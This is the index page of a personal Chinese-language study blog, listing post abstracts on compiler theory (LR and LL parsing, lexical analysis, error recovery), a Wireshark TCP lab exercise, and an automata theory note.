

<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="UTF-8">
  <title> [ Dnull_P Welcome~ ]</title>
  
  <!-- stylesheets list from _config.yml -->
  
  <link rel="stylesheet" href="/css/Genso.css">
  
  <link rel="stylesheet" href="/css/layout/layout.css">
  
  <link rel="stylesheet" href="/css/layout/navigator.css">
  
  <link rel="stylesheet" href="/css/layout/page-container.css">
  
  <link rel="stylesheet" href="/css/layout/page-cover.css">
  
  <link rel="stylesheet" href="/css/layout/slidebar.css">
  
  <link rel="stylesheet" href="/css/index/index.css">
  
  <link rel="stylesheet" href="/css/index/recommend-card-container.css">
  
  <link rel="stylesheet" href="/css/index/card-container.css">
  
  <link rel="stylesheet" href="/css/index/card.css">
  
  <link rel="stylesheet" href="/css/post/post.css">
  
  <link rel="stylesheet" href="/css/post/idea.css">
  
  <link rel="stylesheet" href="/css/tool/color.css">
  
  
  <script>
    const urlList = ('https://s2.loli.net/2023/07/23/mivfcl7wqgVsYdP.jpg,https://s2.loli.net/2023/07/23/E3uyek7OVlJgtLT.jpg,https://s2.loli.net/2023/07/23/q9skN6cPAZ14fwH.png,https://s2.loli.net/2023/07/23/RedmkprBY81ZhaV.jpg,https://s2.loli.net/2023/07/23/pt1ArR7NqO8vMXl.png,https://s2.loli.net/2023/07/23/MZEW5UCFSBPiNvH.png,https://s2.loli.net/2023/07/23/8urpklSmq6xR5LF.jpg,https://s2.loli.net/2023/07/23/E6Os9tkrRP4FZ7f.jpg,https://s2.loli.net/2023/07/23/IPq4HsZCOfTMGxk.jpg,https://s2.loli.net/2023/07/23/sAhIbjyLeMBgfuw.jpg,https://s2.loli.net/2023/07/23/ipTsxHoDOawRrfM.png,https://s2.loli.net/2023/07/23/eTYKcWz7jb5mqyo.png,https://s2.loli.net/2023/07/23/lHLk3OMeY7qXnTP.jpg,https://s2.loli.net/2023/07/23/u9dvATztknGecmI.jpg,https://s2.loli.net/2023/07/23/calWvPZEbI9tG4o.png,https://s2.loli.net/2023/07/23/MLZr1j7hdDnIHGU.png,https://s2.loli.net/2023/07/23/PlqeV1XpgQrxI8u.jpg,https://s2.loli.net/2023/07/23/uWQXFEBh5iCcNJV.png,https://s2.loli.net/2023/07/23/xjcUksAMvHQVhim.jpg,https://s2.loli.net/2023/07/23/Bd46rfJ2HYhQGkM.jpg,https://s2.loli.net/2023/07/23/1BgtkI3Aw58qrGv.jpg,https://s2.loli.net/2023/07/23/z8naFUvWV7BfKud.jpg,https://s2.loli.net/2023/07/23/Xj4wlzuKTDQOmHh.png,https://s2.loli.net/2023/07/23/mKzLHqPkUWTivAu.png,https://s2.loli.net/2023/07/23/a36bWlVynziMrSU.jpg,https://s2.loli.net/2023/07/23/6ZNUeJAtDCRvWq8.jpg,https://s2.loli.net/2023/07/23/7nGYxgcyoi8aSIR.jpg,https://s2.loli.net/2023/07/23/EVeCvBAt1LOgJSU.jpg,https://s2.loli.net/2023/07/23/onE5MQBPGdzDROh.jpg,https://s2.loli.net/2023/07/23/316kgDancGthANM.jpg,https://s2.loli.net/2023/07/23/oeRXvLm5byqgazF.jpg,https://s2.loli.net/2023/07/23/HXj7NsSW5vyCoIn.jpg,https://s2.loli.net/2023/07/23/sqM2XznWeEol3f4.jpg,https://s2.loli.net/2023/07/23/xGAflC5roSOsJRz.jpg,https://s2.loli.net/2023/07/23/cF2oWANXImMREKx.jpg,https://s2.loli.net/2023/07/23/IqutSTML7EXRza3.jpg,https://s2.loli.net/2023/07/23/zYNG9XHIEfg4quh.png').split(',');
  </script>

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div class="background">
  

  <img src="https://s2.loli.net/2023/07/23/sAhIbjyLeMBgfuw.jpg" alt="">

  <div class="title-text animate__animated animate__bounce">
    <h1>This is
      <span class="name">
        Dnull_P
      </span>
    </h1>
    Welcome Hell !

  </div>
</div>

<div class="background-coverage">
  <!--Typed text-->
  <div class="background-coverage-text">
    <span id="background-coverage-text">
    </span>
  </div>
</div>

<div class="background-occupation">

</div>

  <div class="navigator">
  <div class="navi-buttom-container">
    
    
  <a href="/" class="navi-buttom">
    <div>
      Home
    </div>
  </a>
  
  
    
  <a href="/about" class="navi-buttom">
    <div>
      About
    </div>
  </a>
  
  
    
  <a href="/contact" class="navi-buttom">
    <div>
      Contact
    </div>
  </a>
  
  
    
    <div class="navi-dropdown">
      <div class="dropbtn">
        post
      </div>
      <div class="dropdown-content">
        
        <a href="/archives">
          Aarchives
        </a>
        
        <a href="/tags">
          Tags
        </a>
        
      </div>
    </div>
  </div>
  
  
</div>

  <div class="page-container">
    <div class="slidebar-warp">
  <div class="slidebar">
    <div class="panel">

      <div class="avatar">
        <img src="/pic/avatar.jpg" alt="">
      </div>

      <div class="info">
        <div class="subinfo-1">
          <div class="subinfo-1-left">
            <div class="subinfo-1-left-info">
              <div class="subinfo-1-left-info-inner">
                <div class="subinfo-1-left-info-front">
                  Post
                </div>
                <div class="subinfo-1-left-info-back random-color">
                  163
                </div>
              </div>
            </div>

            <div class="subinfo-1-left-info">
              <div class="subinfo-1-left-info-inner">
                <div class="subinfo-1-left-info-front">
                  Cate
                </div>
                <div class="subinfo-1-left-info-back random-color">
                  40
                </div>
              </div>
            </div>

            <div class="subinfo-1-left-info">
              <div class="subinfo-1-left-info-inner">
                <div class="subinfo-1-left-info-front">
                  Tag
                </div>
                <div class="subinfo-1-left-info-back random-color">
                  198
                </div>
              </div>
            </div>

          </div>

          <div class="subinfo-1-right">
            <div class="subinfo-1-right-inner">
              <div class="subinfo-1-right-front">
                This Month
              </div>
              <div class="subinfo-1-right-back random-color">
                9
              </div>
            </div>
          </div>
        </div>

        <div class="subinfo-2-wrap">
          <div class="subinfo-2">

            
            <div class="sociallink">
    <a href=https://github.com/DnullP>
      <img src="/svg/github.svg" alt="">
    </a>
</div>
            

          </div>
        </div>
      </div>

      <div class="more-opt">

      </div>

    </div>

    <div class="icon-warp">


      <button class="hide-slidebar-button">
        <img src="/svg/arrow-right-line.svg" id="slideBarArrow">
      </button>


    </div>
  </div>
</div>

    <div class="content">
      




<div class="card-container">

  <div class="card-list-title">
  <div class="card-list-title-text">
    <h2 class="divider">
      
      文章列表
      
    </h2>
  </div>
  
</div>

  
  
  

<div class="card" style="justify-content: left;">

  <div class="card-content">

    <div class="card-info-warp">
      <div class="card-info">
        2023-04-27
      </div>
      <div class="card-info">
        3.4k字
      </div>
      <div class="card-info">
        阅读时间: 3 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <div style="transform: translateX(10px);">
      <a class="card-title" href="/2023/04/27/compiler/CH4-Bottom-Up-Parse/">
        编译原理-自底向上解析
      </a>
      <span class="card-abstract" style="transform: translateX(0px);">
        
## 几个关键词

### shift-reduce parser
移入-归约解析器, 具体步骤也是维护一个栈, 依次将输入推入栈中, 然后当栈中解析到**句柄(Handle)** 时, 进行归约操作

### Handle
句柄, 是解析树中最左父子关系的全部叶节点

为了描述清楚这个概念, 我们先解释**短语(Phrase)**和**直接短语(Direct Phrase)**

这是一棵解析树:
```Mermaid
graph TD
    S --&gt; E
    E --&gt; T
    E --&gt; E&#39;&#39;
    E --&gt; E&#39;
    E&#39; --&gt; id3
    E&#39;&#39; --&gt; +
    T --&gt; id1
    T --&gt; T&#39;
    T&#39; --&gt; *
    T&#39; --&gt; id2
    
```

- 在这个这个解析树表示的句子是`id3 + id1 * id2`, 其中的任意从左到右的叶子都是一个**短语**, 比如`id3 + id1 * id2`本身或者`id1 * id2`
我们也可以用**树结构**来解释: 所有叶节点都是non-terminal的树, 我们称之为一个**短语**

- 其中, 只拥有**父子节点关系**的短语我们称为直接短语, 比如`* id2`是一个直接短语, `id3`是一个直接短语, `id1`所在的子树由于和`* id2`之间有`T`节点, 产生了gap, 所以不是直接短语

- 在这些直接短语中, 最左边的直接短语被称为**句柄(Handle)** , 所以上图的句柄为`id3`

### LR(0)

假设现在我们有一个文法:
$$
\begin{aligned}
S &amp;\rightarrow E\\
E &amp;\rightarrow E + T\\
E &amp;\rightarrow T\\
T &amp;\rightarrow T * F\\
T &amp;\rightarrow F\\
F &amp;\rightarrow (E)\\
F &amp;\rightarrow id
\end{aligned}
$$

我们构建其**增广文法(Augmented Grammar)**:
$$
\begin{aligned}
S&#39; &amp;\rightarrow S\\
S &amp;\rightarrow E\\
E &amp;\rightarrow E + T\\
E &amp;\rightarrow T\\
T &amp;\rightarrow T * F\\
T &amp;\rightarrow F\\
F &amp;\rightarrow (E)\\
F &amp;\rightarrow id
\end{aligned}
$$

#### Items
LR(0)文法的状态机的状态我们用Items(项目)来表示, 一个项目是一个产生式, 许多个项目组成产生式集, 产生式集构成状态机的状态

我们先设定一个初始的0状态:
$$
\begin{aligned}
S&#39; &amp;\rightarrow \cdot S\\
S &amp;\rightarrow \cdot E\\
E &amp;\rightarrow \cdot E + T\\
E &amp;\rightarrow \cdot T\\
T &amp;\rightarrow \cdot T * F\\
T &amp;\rightarrow \cdot F\\
F &amp;\rightarrow \cdot (E)\\
F &amp;\rightarrow \cdot id
\end{aligned}
$$
这里的$\cdot$表示**点(dot)**, 代表了我们读取到的位置, 前面表示已经读取到的终结符或句型, 后面表示接下来希望读到的东西

0状态的构建逻辑为: 以$S&#39;\rightarrow S$为基础, 在dot之后紧接的非终结符将其的产生式加入其中, 所以添加了$S\rightarrow \cdot E$以及后续的一系列产生式

然后针对每个项目, 我们为其构造一个转移状态, 以$E \rightarrow \cdot E + T$为例:

我们构造一个新的状态(项目集), 编号为1, 如下:

$$
\begin{aligned}
E &amp;\rightarrow E \cdot + T\\
\end{aligned}
$$
由于点后是个终结符, 所以不需要添加额外的推导项目, 如果是由$F \rightarrow \cdot( E)$读取 $($ 后转移到状态2, 那么状态2中则需要添加的条目为: $F \rightarrow (\cdot E )$, 以及所有可以通过点后的非终结式推导得到: $E \rightarrow \cdot E + T$ 和 $E \rightarrow \cdot T$ 进而还有 $T \rightarrow \cdot T * F$ 和 $T \rightarrow \cdot F$ 以及 $F \rightarrow \cdot (E)$ 和 $F \rightarrow \cdot id$

但是所有这些通过推导添加的项目我们都称为**非核心项目(non-kernel-item)**, 而$F \rightarrow (\cdot E )$称为**核心项目(kernel-item)**

这样, 我们可以构建出一个由项目集做状态的自动机来, 类似于以下的形式:
![](/image/compiler/3.png)

然后以下的状态机我们可以构造为一张语法分析表:

![](/image/compiler/4.png)

具体构造方式如下:
- 首先计算出每个句型的FOLLOW集, 比如 $FOLLOW(T) = \{*,(,id\}$
- 然后对于每一个状态, 对应了表中的每一行, 对于该状态的每一个读取句型(非终结符)的转移, 我们通过GOTO表来保存
- 如果是读取终结符的转移, 我们在ACTION中对应符号处记录`si`, 表示转移到状态i
- 如果某个项目的dot在最右端, 那么我们为其FOLLOW集中的对应符号添加ACTION `rj`, 代表按照第j个产生式进行归约(这里没有列出产生式, 但是可以通过状态转移图略知)

有了这个图就可以判断如何对句子进行归约了

---

### LR(1)
将0改为了1, 表示向后多读一个字符, 当执行归约操作时, 只有多读的这个字符满足了条件才会进行归约

比如对于下面的项目:
$$
\begin{aligned}
E &amp;\rightarrow E  + T\cdot , id\\
\end{aligned}
$$
表示只有当向后读取的输入是一个id时, 才会进行归约

需要注意的是, 我们之前移动dot的操作和推导全部非核心项目(即求闭包)的过程有些改变:
现在我们移动dot获得新项目时需要考虑向后读取字符的变化, 具体的改变方式如下:

- 首先我们记住一个项目规范格式:
  $$
    A \rightarrow \alpha \cdot B \beta, a
  $$
- 对于以上的标准项目, 我们得到他的下一个项目$A \rightarrow \alpha B \cdot \beta, x$
  其中的向后读的内容需要改变, 这里用$x$来代替
- 我们需要求出$FIRST(\beta a)$, 然后用这个集合中的每一个字符来代替$x$, 从而得到若干新的项目

---

## viable prefix(可行前缀)
可行前缀反应到解析的栈中, 就是整个过程中栈的每一个状态, 也就是不会归约的最长串

反应到状态转移图中就是每一条路径

## valid item(有效项目)
当项目的dot左方的串等于一个可行前缀时, 该项目就是有效项目


      </span>
    </div>
  </div>

  <div class="card-img">
    <div class="img-container"></div>
  </div>

</div>



  
  
  
<div class="card" style="justify-content: right;">

  <div class="card-img">
    <div class="img-container"></div>
  </div>

  <div class="card-content">
    <div class="card-info-warp">
      <div class="card-info">
        2023-04-27
      </div>
      <div class="card-info">
        2.1k字
      </div>
      <div class="card-info">
        阅读时间: 2 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <a class="card-title" href="/2023/04/27/compiler/CH4-Top-Down-Parse/">
      编译原理-自顶向下解析
    </a>
    <span class="card-abstract">
      
# 自顶向下解析

## 基本概念
所谓自顶向下解析, 就是从语法树的最上层开始, 向下推导出目标的语言

比如我们有以下语法:
$$
S \rightarrow E\\
E \rightarrow TE&#39;\\
E&#39; \rightarrow +TE&#39; | \epsilon\\
T \rightarrow FT&#39;\\
T&#39; \rightarrow *FT&#39; | \epsilon\\
F \rightarrow (E) | id
$$
我们可以逐步推导出`id + id * id`这样的语句:
$$
\begin{aligned}
S &amp;\rightarrow E \\ 
  &amp;\rightarrow TE&#39;\\
  &amp;\rightarrow FT&#39;E&#39;\\
    &amp;\rightarrow idT&#39;E&#39;\\
    &amp;\rightarrow id + TE&#39;\\
    &amp;\rightarrow id + FT&#39;E&#39;\\
    &amp;\rightarrow id + idT&#39;E&#39;\\
    &amp;\rightarrow id + id * FT&#39;\\
    &amp;\rightarrow id + id * id
\end{aligned}
$$
这个过程其实就是在自动机理论中学的PDA, 我们有一个栈来维护自上而下的推导, 同时读取新的输入, 每个输入和栈顶元素会有不同的&#34;动作&#34;

在详细描述推导过程中如何选择产生式前, 我们先看一下递归下降法

## 递归下降法

我们对每一个产生式构建一个函数, 比如:
$$E&#39; \rightarrow +TE&#39; | \epsilon$$
我们可以构建以下函数:
```cpp
void E_() {
    if (lookahead == &#39;+&#39;) {
        match(&#39;+&#39;);
        T();
        E_();
    }
}
```
而对于$$E \rightarrow TE&#39;\\$$, 我们可以构建以下函数:
```cpp
void E() {
    T();
    E_();
}
```
其中的`match`表示当前匹配了一个字符的输入, 进行相应的操作并读取下一个字符输入

通过这种一层套一层的函数调用, 我们可以完成对一段输入的解析, 在第二章中的简易翻译程序中, 我们也是通过这种方式来完成的

这其实也是PDA所做的事情, 每一层的调用就相当于进行了一次栈的变化

- 有时候可能会发生调用到一定位置后, 无法继续解析的情况, 需要回溯到某一步重新解析, 此时需要从新扫描之前的输入. 很明显我们这里的代码是不支持回溯的, 而是也很少有代码解析需要用到回溯机制, 所以我们需要设计能够线性读取解析的文法

对于这样不需要回溯就能够解析完成的文法, 我们称为**LL(1)文法**

首先, 对于**左递归**的文法和**二义性**的文法肯定不是LL(1)文法, 所以我们在设计文法时应该消除文法中的左递归, 并尽量减少二义性

### First集和Follow集
我们对First集和Follow集的定义如下:
- First(E): 对于非终结符E, 其推导式中可以出现的第一个终结符的集合
- Follow(E): 对于非终结符E, 在其之后可能紧跟的终结符的集合

对于First我们很容易求得, 至于求Follow的话, 有以下三种情况:
- $Follow(S)$中自然包含结束符号$\$$, $S$为开始符号
- 如果有产生式$A \rightarrow \alpha B \beta$, 那么$First(\beta)$中的所有元素都在$Follow(B)$中
- 如果有产生式$A \rightarrow \alpha B$, 或者$A \rightarrow \alpha B \beta$, 且$First(\beta)$包含$\epsilon$, 那么$Follow(A)$中的所有元素都在$Follow(B)$中

通过这两个集合我们可以构建出类似下图的预测分析表:
![预测分析表](/image/compiler/1.png)
当一个各自中出现两个产生式时, 这个文法就产生了二义性, 我们可以通过提取左公因子, 消除左递归等方式来尽量避免二义性, 但是有些文法本身就无法消除二义性, 比如产生的如下预测分析表:

![预测分析表](/image/compiler/2.png)

不过这个文法我们可以选择其中的$S \rightarrow eS$作为保留的产生式, 以此来消除二义性

### 使用栈来模拟
我们之前就提到了PDA, 递归下降法我们自然可以通过一个带有栈的PDA来模拟, 详细内容就不说明了
    </span>

  </div>

</div>



  
  
  

<div class="card" style="justify-content: left;">

  <div class="card-content">

    <div class="card-info-warp">
      <div class="card-info">
        2023-04-27
      </div>
      <div class="card-info">
        1.5k字
      </div>
      <div class="card-info">
        阅读时间: 1 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <div style="transform: translateX(10px);">
      <a class="card-title" href="/2023/04/27/compiler/CH4-note/">
        编译原理-语法解析
      </a>
      <span class="card-abstract" style="transform: translateX(0px);">
        
## 关键词记录解释

### Bottom-up-parse, Top-down-parse
- Bottom-up-parse
  自底向上的解析, 从最小的语法单元开始解析, 直到解析到最大的语法单元, 使用右线性文法的语言适合使用Bottom-up-parse

- Top-down-parse
  自顶向下的解析, 从最大的语法单元开始解析, 直到解析到最小的语法单元, 使用左线性文法的语言适合使用Top-down-parse, 需要避免左递归

### Error type
- Lexical error
  词法错误, 例如`int a = 10;`中的`int`写成了`intt`
- Syntactic error
  语法错误, 例如`case`缺少对应的`switch`, `else`缺少对应的`if`
- Semantic error
  语义错误, 例如需要返回`int`类型的函数返回了`string`类型的值, 并且没有支持的隐式转换(implicit conversion)
- Logical error
  逻辑错误, 例如`a = a + 1`写成了`a = a - 1`或者`a == 10`写成了`a = 10`, 这些错误并不会导致程序无法运行, 但是会使得程序偏离预期的结果

### viable-prefix property
可行前缀性, 我们的Lexical analyzer产生了一传的token stream给parser, parser可以接收流并进行解析, 在遇到错误时直接处理, 而不用等到所有的Token都解析完毕
也就是说我们可以根据语言的前缀来判定解析的可行性, 这样的流式处理也能很好的利用计算资源

但是只有语法解析(Syntactic analysis)可以利用可行前缀性, 语义解析则往往需要向后解析许多后才能确定错误

### 语法解析需要提供的

- report the error presence
    报告错误的存在, 一般定位到产生错误的行和列

- recover from the error
    从错误中恢复, 并继续解析, 以便发现后续的错误

- 尽量优化程序解析的效率

### 如何从错误中恢复
- panic mode recovery
  恐慌模式恢复, 当遇到错误时, 丢弃当前的token, 直到遇到一个同步符号, 然后继续解析, 例如`int a = 10;`中的`int`写成了`intt`, 那么我们会丢弃`intt`直到遇到`;`为止, 然后继续解析

- phrase-level recovery
  编译器会尝试修复一些简单的错误, 比如缺少`;`之类的, 会自动补上这些符号, 然后继续解析

- Error productions
  编译器的设计人员在编译器中加入了一些常见错误语法的产生式, 并执行相应的错误反馈, 比如在python中输入了`;`在statement的结尾, 就会告诉你`python的结尾不需要;`, 这样解析并不会陷入错误, 然后继续解析

- Global correction
  编译器尝试寻找一个最接近源代码的, 可以正确解析的代码, 尽管这样的代码并不是程序员想要的, 但是可以提供一个修改代码的评估

      </span>
    </div>
  </div>

  <div class="card-img">
    <div class="img-container"></div>
  </div>

</div>



  
  
  
<div class="card" style="justify-content: right;">

  <div class="card-img">
    <div class="img-container"></div>
  </div>

  <div class="card-content">
    <div class="card-info-warp">
      <div class="card-info">
        2023-04-25
      </div>
      <div class="card-info">
        1.3k字
      </div>
      <div class="card-info">
        阅读时间: 1 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <a class="card-title" href="/2023/04/25/compiler/CH3-note/">
      编译原理-词法解析
    </a>
    <span class="card-abstract">
      
## 依然还是关键词的记录

### Lexeme, Token, Pattern
- Token:
  &lt;id, &#34;a&#34;&gt;
  &lt;num, 10&gt;
  像这样已经完成解析, 包含了若干属性的单元我们称为Token
- Pattern:
  模式, 用来匹配一个串的, 比较常见的匹配包括了正则匹配
- Lexeme:
  最小的语句单元, 我们可以认为一个模式所能匹配的最小单元为一个Lexeme(词素)
`int a = 10` 

在这里面, `int` `a` `=` `10` 都是词素, 匹配了每一个词素的规则(一般是正则表达式)称为模式, 模式匹配的结果`&lt;id, &#39;a&#39;&gt;`称为Token

### concatenation, exponentiation
- concatenation
  连接, 例如`ab`表示`a`和`b`的concatenation
- exponentiation
  幂, 例如`a^3 = aaa`表示`a`的0次或多次concatenation

### KMP和DFA
又见到KMP了, 回头再简单集记篇随笔说说kmp和DFA

### NFA, DFA, Regular Expression
这部分记自动机内了

### Regular Definition
正则定义是一些正则表达式定义的变量, 用以组成complex language, 比如: `digit = [0-9]`, `letter = [a-zA-Z]`都是正则定义

### Flex
Flex是一个词法分析器生成器, 用来生成词法分析器, 词法分析器的输入是一个正则表达式, 输出是一个DFA, 用来匹配输入的字符串, 词法分析器的输出是一个Token序列

- flex中的正则表达式按照最长优先匹配
- 按照编写的顺序优先匹配

### two buffers
缓冲区是必要的, 对于大型源码一次性读完浪费, 从磁盘读取又太慢, 但是使用缓冲区必然产生断层, 所以使用两个缓冲区来交替连接

当读到一个缓冲区的结尾时, 将另一个缓冲区进行刷新, 然后读取头移动到另一个缓冲区即可

一般我们编写代码时要避免缓冲区溢出, 比如对于一个超长的字符串, 我们应该拆分为String的concatenation形式

### lexemepos, forward
lexemepos记录词素的开始位置, forward向后读若干位, 直到到达一个无法转移的状态, 然后再之前的匹配中寻找满足要求的匹配

---

## 记几个概念点:

### 词法分析器生成器的架构

flex读取了lex源码后, 会生成对应的词法分析器, 而词法分析器本身是个状态机, 我们可以选择用NFA和DFA来生成这个分析器, 不过一般会选用DFA, 其状态转移更简明

    </span>

  </div>

</div>



  
  
  

<div class="card" style="justify-content: left;">

  <div class="card-content">

    <div class="card-info-warp">
      <div class="card-info">
        2023-04-21
      </div>
      <div class="card-info">
        3.3k字
      </div>
      <div class="card-info">
        阅读时间: 3 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <div style="transform: translateX(10px);">
      <a class="card-title" href="/2023/04/21/network/works-projects/wireShark-4-TCP/">
        wireshark practice 4 - TCP
      </a>
      <span class="card-abstract" style="transform: translateX(0px);">
        
1.	What is the IP address and TCP port number used by the client computer (source) that is transferring the file to gaia.cs.umass.edu?  To answer this question, it’s probably easiest to select an HTTP message and explore the details of the TCP packet used to carry this HTTP message, using the “details of the selected packet header window” (refer to Figure 2 in the “Getting Started with Wireshark” Lab if you’re uncertain about the Wireshark windows.
```
Source Port: 52188
I am not sure whether it&#39;s due to my proxy
 so that the source port is not 80
```


2.	What is the IP address of gaia.cs.umass.edu? On what port number is it sending and receiving TCP segments for this connection?
```
Destination Address: 128.119.245.12
Port: 80
```
If you have been able to create your own trace, answer the following question:

3.	What is the IP address and TCP port number used by your client computer (source) to transfer the file to gaia.cs.umass.edu?  
```
Source Address: 10.21.180.15
Source Port: 52188
```
---
4.	What is the sequence number of the TCP SYN segment that is used to initiate the TCP connection between the client computer and gaia.cs.umass.edu?  What is it in the segment that identifies the segment as a SYN segment?
```
Seq = 0
the SYN tag is set in the Flag field
```

5.	What is the sequence number of the SYNACK segment sent by gaia.cs.umass.edu to the client computer in reply to the SYN?  What is the value of the Acknowledgement field in the SYNACK segment?  How did gaia.cs.umass.edu determine that value? What is it in the segment that identifies the segment as a SYNACK segment?
```
Seq = 0
Ack = 1
Ack的值取决于服务器接收到的数据包的数量
服务器会返回流量窗口中的头部(base)位置的编号, 表示下一个需要接收的数据编号
```
6.	What is the sequence number of the TCP segment containing the HTTP POST command?  Note that in order to find the POST command, you’ll need to dig into the packet content field at the bottom of the Wireshark window, looking for a segment with a “POST” within its DATA field.
```
Seq = 1 contains the POST command
```

7.	Consider the TCP segment containing the HTTP POST as the first segment in the TCP connection. What are the sequence numbers of the first six segments in the TCP connection (including the segment containing the HTTP POST)?  At what time was each segment sent?  When was the ACK for each segment received?  Given the difference between when each TCP segment was sent, and when its acknowledgement was received, what is the RTT value for each of the six segments?  What is the EstimatedRTT value (see Section 3.5.3, page 242 in text) after the receipt of each ACK?  Assume that the value of the EstimatedRTT is equal to the measured RTT for the first segment, and then is computed using the EstimatedRTT equation on page 242 for all subsequent segments.
Note: Wireshark has a nice feature that allows you to plot the RTT for each of the TCP segments sent.  Select a TCP segment in the “listing of captured packets” window that is being sent from the client to the gaia.cs.umass.edu server.  Then select: Statistics-&gt;TCP Stream Graph-&gt;Round Trip Time Graph.

```
计算部分就不算了, 但是在使用wireshark RTT图时, 
示例中的传输时间可能太短了, 所以整个RTT只显示了
一个点
      </span>
    </div>
  </div>

  <div class="card-img">
    <div class="img-container"></div>
  </div>

</div>



  
  
  
<div class="card" style="justify-content: right;">

  <div class="card-img">
    <div class="img-container"></div>
  </div>

  <div class="card-content">
    <div class="card-info-warp">
      <div class="card-info">
        2023-04-10
      </div>
      <div class="card-info">
        947字
      </div>
      <div class="card-info">
        阅读时间: 1 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <a class="card-title" href="/2023/04/10/compiler/CH1-note/">
      编译原理-引言
    </a>
    <span class="card-abstract">
      
## 一些关键词的记录

### name, identifier, variable
- name
  名字关联的是一个实体, 例如变量, 函数, 类型, 常量等, 并且会根据环境(environment)的不同而有不同的内存位置
- identifier
  标识符, 是名字的一个子集
  相对于标识符, 名字还包括了表达式, 比如成员变量的表示`a.b`
- variable
  变量表示内存中的一个位置, 一个变量可以有多个名字

### environment, state
- environment
  环境是一个映射, 用来表示名字和变量(内存位置)之间的关系
- state
    状态是一个映射, 用来表示变量和值之间的关系

### phase, pass
- phase
  编译器的阶段, 包括lexcial analysis, syntax analysis, semantic analysis, intermediate code generation, code optimization, code generation等
- pass
  对程序的一次扫描称为一次pass

### compiler, interpreter, assembler
- compiler
  编译器, 将源程序翻译成目标程序代码
- interpreter
  解释器, 直接读取源程序运行
- assembler
  汇编器, 将汇编语言翻译成机器码, 可直接被内存加载运行

### scope, block
- scope
  作用域, 一个声明的作用范围
- block
  代码块, 其中的声明作为一个作用域
- static scope
  静态作用域, 作用域是在编译时确定的, 向上寻找包含声明的作用域
- dynamic scope
    动态作用域, 作用域是在运行时确定的, 从运行堆栈中寻找包含声明的作用域
    </span>

  </div>

</div>



  
  
  

<div class="card" style="justify-content: left;">

  <div class="card-content">

    <div class="card-info-warp">
      <div class="card-info">
        2023-04-10
      </div>
      <div class="card-info">
        1.2k字
      </div>
      <div class="card-info">
        阅读时间: 1 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <div style="transform: translateX(10px);">
      <a class="card-title" href="/2023/04/10/compiler/CH2-note/">
        编译原理-A-Simple-directed-translator
      </a>
      <span class="card-abstract" style="transform: translateX(0px);">
        
## 一些关键词及含义的记录

### left-associative, right-associative

- left-associative
  如果一个运算符的结果是从左到右结合的, 则为left-associative, 比如加减乘除都是left-associative的

- right-associative
  如果一个运算符的结果是从右到左结合的, 则为right-associative, 比如幂运算和赋值就是right-associative的
  
### ambiguity
如果一个语言可以通过文法产生多个不同的语法树, 则称该文法是ambiguous的

可以通过给运算加上优先级来消除ambiguity, 比如可以写出四则运算的文法如下:
    
```ebnf
&lt;expr&gt; ::= &lt;expr&gt; + &lt;term&gt; | &lt;expr&gt; - &lt;term&gt; | &lt;term&gt;
&lt;term&gt; ::= &lt;term&gt; * &lt;factor&gt; | &lt;term&gt; / &lt;factor&gt; | &lt;factor&gt;
&lt;factor&gt; ::= ( &lt;expr&gt; ) | &lt;number&gt;
&lt;number&gt; ::= 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9
```

### abstract syntax tree, concrete syntax tree

- abstract syntax tree
  语法树, 用来表示语法结构, 一般用来表示语法分析的结果
  使用程序中的结构来作为节点, 比如`a + b + c`的语法树如下:
  ```Mermaid
  graph TD
  p1[+] --&gt; a
  p1 --&gt; p2[+]
  p2 --&gt; b
  p2 --&gt; c
  ```
- concrete syntax tree
  解析树(parse tree), 用非终结符作为节点, 用来表示语法结构
  使用文法中的符号来作为节点, 比如`a + b + c`的解析树如下:
  ```Mermaid
  graph TD
  p1[expr] --&gt; p2[expr]
  p1 --&gt; p3[+]
  p1 --&gt; p4[term]
  p2 --&gt; p5[expr]
  p2 --&gt; p6[+]
  p2 --&gt; p7[term]
  p5 --&gt; p8[term]
  p4 --&gt; p9[c]
  p7 --&gt; p10[b]
  p8 --&gt; p11[a]
  ```


      </span>
    </div>
  </div>

  <div class="card-img">
    <div class="img-container"></div>
  </div>

</div>



  
  
  
<div class="card" style="justify-content: right;">

  <div class="card-img">
    <div class="img-container"></div>
  </div>

  <div class="card-content">
    <div class="card-info-warp">
      <div class="card-info">
        2023-04-09
      </div>
      <div class="card-info">
        3.1k字
      </div>
      <div class="card-info">
        阅读时间: 3 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <a class="card-title" href="/2023/04/09/automata-theory/CH6-CFG-reduction/">
      形式语言与自动机 CFG的化简和规范
    </a>
    <span class="card-abstract">
      
# 上下文无关文法的化简

上下文无关文法的化简可以分为三个部分:

